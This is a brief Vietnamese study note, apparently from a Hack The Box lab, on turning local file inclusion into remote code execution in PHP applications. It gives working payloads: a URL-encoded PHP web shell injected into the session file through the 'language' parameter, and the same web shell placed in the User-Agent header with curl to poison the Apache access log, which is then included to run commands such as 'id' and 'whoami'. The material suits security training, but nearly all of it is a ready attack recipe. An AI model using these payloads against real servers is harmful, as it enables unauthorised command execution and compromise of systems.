Thề cái chương này nó ảo 

1. Session Poisoning Payload
Gửi payload thông qua tham số language để ghi mã PHP vào file session:
  http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
   Giải mã URL sẽ ra: <?php system($_GET["cmd"]); ?>
  Sau đó include lại file session, ví dụ:
  http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id

2. Server Log Poisoning Payload
Sử dụng User-Agent header để chèn mã PHP vào log:
  User-Agent: <?php system($_GET['cmd']); ?>
Ví dụ gửi bằng curl:
  echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
  curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
Sau đó include log qua LFI để thực thi:
  http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id



Trong bài lab của HTB là như này 
  GET /index.php?language=/var/log/apache2/access.log&cmd=whoami
  User-Agent: <?php system($_GET['cmd']); ?>
    -> Kết quả trả về lệnh whomai đã được thực thi 
